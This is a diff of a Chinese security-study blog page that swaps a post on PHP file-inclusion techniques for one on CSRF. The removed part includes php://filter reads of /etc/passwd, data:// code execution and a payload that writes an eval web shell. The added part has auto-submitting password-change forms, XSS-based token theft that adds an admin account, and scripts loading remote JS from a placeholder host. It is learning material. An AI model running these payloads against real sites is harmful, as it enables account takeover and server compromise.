@@ -6,21 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>文件包含 | welcome to my blogs</title>
+  <title>csrf | welcome to my blogs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="本地文件包含执行代码，读取文件不管包含文件后缀是否是php，都会尝试当作php文件执行，如果文件内容的确为php，则会正常执行并返回结果，如果不是，则会原封不动打印文件内容，可以配合文件上传漏洞。">
+  <meta name="description" content="请求方式get利用html里的带src属性的元素发出跨域请求">
 <meta property="og:type" content="article">
-<meta property="og:title" content="文件包含">
-<meta property="og:url" content="http://yoursite.com/2018/06/01/interview-file-iuclude/index.html">
+<meta property="og:title" content="csrf">
+<meta property="og:url" content="http://yoursite.com/2018/06/09/summary-csrf/index.html">
 <meta property="og:site_name" content="welcome to my blogs">
-<meta property="og:description" content="本地文件包含执行代码，读取文件不管包含文件后缀是否是php，都会尝试当作php文件执行，如果文件内容的确为php，则会正常执行并返回结果，如果不是，则会原封不动打印文件内容，可以配合文件上传漏洞。">
+<meta property="og:description" content="请求方式get利用html里的带src属性的元素发出跨域请求">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2018/06/01/interview-file-iuclude/1.png">
-<meta property="og:updated_time" content="2018-06-02T08:25:16.855Z">
+<meta property="og:updated_time" content="2018-06-11T04:44:39.014Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="文件包含">
-<meta name="twitter:description" content="本地文件包含执行代码，读取文件不管包含文件后缀是否是php，都会尝试当作php文件执行，如果文件内容的确为php，则会正常执行并返回结果，如果不是，则会原封不动打印文件内容，可以配合文件上传漏洞。">
-<meta name="twitter:image" content="http://yoursite.com/2018/06/01/interview-file-iuclude/1.png">
+<meta name="twitter:title" content="csrf">
+<meta name="twitter:description" content="请求方式get利用html里的带src属性的元素发出跨域请求">
   
     <link rel="alternative" href="/atom.xml" title="welcome to my blogs" type="application/atom+xml">
   
@@ -64,7 +62,7 @@
 	        
 				<li><a href="/categories/essays/">随笔</a></li>
 	        
-				<li><a href="/categories/interview/">面试</a></li>
+				<li><a href="/categories/summary/">总结</a></li>
 	        
 			</ul>
 		</nav>
@@ -136,7 +134,7 @@
 		        
 					<li style="width: 33.333333333333336%"><a href="/categories/essays/">随笔</a></li>
 		        
-					<li style="width: 33.333333333333336%"><a href="/categories/interview/">面试</a></li>
+					<li style="width: 33.333333333333336%"><a href="/categories/summary/">总结</a></li>
 		        
 				</ul>
 			</nav>
@@ -151,41 +149,35 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-interview-file-iuclude" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-summary-csrf" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      文件包含
+      csrf
     </h1>
   
 
         
-        <a href="/2018/06/01/interview-file-iuclude/" class="archive-article-date">
-  	<time datetime="2018-06-01T10:51:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-01</time>
+        <a href="/2018/06/09/summary-csrf/" class="archive-article-date">
+  	<time datetime="2018-06-09T09:18:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-09</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>执行代码，读取文件<br>不管包含文件后缀是否是php，都会尝试当作php文件执行，如果文件内容的确为php，则会正常执行并返回结果，如果不是，则会原封不动打印文件内容，可以配合文件上传漏洞。<br><a id="more"></a></p>
-<h3 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>,<span class="keyword">require</span>,<span class="keyword">include_once</span>,<span class="keyword">require_once</span>,highlight_file,show_source,readfile,file_get_contents,fopen等</span><br></pre></td></tr></table></figure>
-<h3 id="跨目录包含"><a href="#跨目录包含" class="headerlink" title="跨目录包含"></a>跨目录包含</h3><p>./表示当前目录<br>../表示上一级目录</p>
-<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>f=php.ini%00r1ngs.php<br>绕过参数结尾要求必须为php<br>(magic_quotes_gpc=off，PHP小于5.3.4有效)</p>
-<h3 id="限制目录"><a href="#限制目录" class="headerlink" title="限制目录"></a>限制目录</h3><p>在php.ini中配置open_basedir限制目录包含于某一个绝对路径，如果包含了父目录的文件会报错，子目录不会<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Warning</span>: include(): open_basedir restriction <span class="keyword">in</span> <span class="keyword">effect</span>. File(<span class="type">C</span>:\1.jpg) is not within the allowed path(s): (<span class="type">C</span>:\<span class="type">PHPstudy</span>\<span class="type">WWW</span>)</span><br></pre></td></tr></table></figure></p>
-<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><ul>
-<li>当php.ini里配置allow_url_fopen=On并且allow_url_include=On时允许包含远程服务器的文件</li>
-<li>但是并不能读取本服务器的内容，比如当你包含远程服务器的phpinfo()的时候，看到的是远程服务器的phpinfo而不是自己的。<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file//协议"></a>file//协议</h3>双off<br>用于读取服务器www以外的文件，需要知道文件的绝对路径<h3 id="php-input协议"><a href="#php-input协议" class="headerlink" title="php://input协议"></a>php://input协议</h3>需要allow_url_include为on<br>用于访问请求的原始数据的只读流，如果是php代码则执行代码比如&lt;?php phpinfo()?&gt;<br>可以用来生成一句话木马文件：<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>), <span class="string">'&lt;?php eval($_POST["cmd"]);?&gt;'</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
+        <h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>利用html里的带src属性的元素发出跨域请求<br><a id="more"></a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0"</span>;<span class="attr">url</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"url"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"url"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">"url"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"url"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">"url"</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"hack"</span> <span class="attr">action</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"passwd_new"</span> <span class="attr">value</span>=<span class="string">"csrf"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"passwd_conf"</span> <span class="attr">value</span>=<span class="string">"csrf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">	document.getElementById("hack").submit();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><h3 id="验证referer"><a href="#验证referer" class="headerlink" title="验证referer"></a>验证referer</h3><ul>
+<li>data:协议访问和https向http跳转时候referer为空</li>
+<li>把文件放在一个GOOGLE.COM的目录，绕过关键字验证<h3 id="使用验证码"><a href="#使用验证码" class="headerlink" title="使用验证码"></a>使用验证码</h3>影响用户体验<h3 id="使用csrf-token"><a href="#使用csrf-token" class="headerlink" title="使用csrf token"></a>使用csrf token</h3>攻击者无法使用js获取外域页面的token值，遵循同源策略</li>
 </ul>
-<h3 id="php-filter协议"><a href="#php-filter协议" class="headerlink" title="php://filter协议"></a>php://filter协议</h3><p>双off，是一种数据流打开时的筛选过滤应用<br>最常用于读取文件源代码<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
-<p>zlib.deflate压缩数据<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>/zlib.deflate/<span class="built_in">convert</span>.base64-encode/resource=/etc/passwd</span><br><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-decode/zlib.inflate/resource=/tmp/<span class="number">1</span></span><br><span class="line">复现失败 没有读取到解压的数据</span><br></pre></td></tr></table></figure></p>
-<h3 id="zip-bzip2-zlib-协议"><a href="#zip-bzip2-zlib-协议" class="headerlink" title="zip://, bzip2://, zlib://协议"></a>zip://, bzip2://, zlib://协议</h3><p>双off<br>可以访问压缩文件中的子文件<br>可以将木马写在txt文件里，然后压缩为zip文件，重命名为jpg文件然后用zip等协议打开<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zip:<span class="string">//C</span>:<span class="string">/PHPstudy/WWW/1.jpg</span>%231.txt <span class="string">//</span><span class="comment">#必须用%23 前面必须是绝对路径</span></span><br><span class="line">compress.zlib:<span class="string">//1.jpg</span> <span class="string">//</span>后两者都可以用相对路径</span><br><span class="line">compress.bzip2:<span class="string">//1.jpg</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h3><p>双on，可以用于执行代码<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span>://text/plain,&lt;?php phpinfo()?&gt;</span></span><br><span class="line"><span class="class"><span class="keyword">data</span>://text/plain;base64,<span class="type">PD9waHAgcGhwaW5mbygpPz4</span>=</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="/2018/06/01/interview-file-iuclude/1.png" alt="1"></p>
+<h3 id="配合xss攻击"><a href="#配合xss攻击" class="headerlink" title="配合xss攻击"></a>配合xss攻击</h3><p>如果网站还存在着一个xss漏洞，可以用xss窃取同域的csrftoken然后发起csrf攻击<br>可以在有xss漏洞的页面嵌入以下代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"../csrf"</span> <span class="attr">onload</span>=<span class="string">alert(frames[0].document.getElementsByName(</span>'<span class="attr">user_token</span>')[<span class="attr">0</span>]<span class="attr">.value</span>)&gt;</span><span class="comment">&lt;!--成功--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"../csrf"</span> <span class="attr">onload</span>=<span class="string">window.open(</span>"<span class="attr">..</span>/<span class="attr">csrf</span>/?<span class="attr">password_new</span>=<span class="string">admin&amp;password_conf</span>=<span class="string">admin&amp;Change</span>=<span class="string">Change&amp;user_token</span>=<span class="string">"+frames[0].document.getElementsByName('user_token')[0].value+"</span>#")&gt;</span></span><br><span class="line"><span class="comment">&lt;!--失败 报错csrf token is incorrect 用window.open重新打开一个以面后token刷新了--&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>没有过滤script关键字<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> frameObj = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    frameObj.setAttribute(<span class="string">"id"</span>, <span class="string">"add"</span>);</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(frameObj);</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"add"</span>).src = <span class="string">"admin.php?c=admin&amp;f=save"</span>;</span><br><span class="line">    <span class="keyword">var</span> token = <span class="built_in">document</span>.getElementById(<span class="string">"add"</span>).contentWindow.document.getElementById(<span class="string">"token"</span>).value; <span class="comment">//从iframe中的页面中获取token值</span></span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123; <span class="comment">// code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line">        xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// code for IE6, IE5</span></span><br><span class="line">        xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"admin.php?c=admin&amp;f=save"</span>, <span class="literal">true</span>);</span><br><span class="line">    xmlhttp.send(<span class="string">"id=1&amp;accont=wooyun&amp;pass=123456&amp;status=1&amp;if_system=1&amp;token="</span>+token); <span class="comment">//带上token提交添加管理员的请求</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>过滤关键字，加载远程的js代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">document.body.appendChild(document.createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'url'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4="</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4="</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx.xxx/a.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 
       
 
@@ -221,7 +213,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/interview//" class="article-tag-list-link color5">interview</a>
+        			<a href="/categories/summary//" class="article-tag-list-link color3">summary</a>
         		</li>
       		
 		</ul>
@@ -276,7 +268,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/06/01/interview-file-iuclude/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/06/09/summary-csrf/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -290,18 +282,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/06/02/interview-xxe/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          xxe
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/05/31/interview-file-upload/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">文件上传</div>
+    <a href="/2018/06/02/summary-xxe/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">xxe</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -428,11 +411,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">C language</a>
+                <a href="javascript:void(0)" class="js-tag color4">homepage</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">homepage</a>
+                <a href="javascript:void(0)" class="js-tag color1">C language</a>
               </li>
             
             <div class="clearfix"></div>
